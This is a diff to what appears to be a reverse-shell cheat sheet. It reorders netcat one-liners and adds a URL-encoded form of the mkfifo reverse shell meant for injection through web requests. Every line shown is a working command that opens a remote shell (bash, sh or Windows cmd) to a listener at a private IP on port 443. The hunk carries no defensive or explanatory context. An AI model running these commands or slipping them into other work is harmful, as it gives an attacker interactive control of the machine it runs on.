@@ -28,10 +28,12 @@
   nc -e /bin/bash 192.168.1.2 443
 
   nc -c bash 192.168.1.2 443
+  
+  nc.exe -e cmd 192.168.1.26 443
 
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
-
-  nc.exe -e cmd 192.168.1.26 443
+  
+  rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.2%20443%20%3E%2Ftmp%2Ff
   ```
 
 
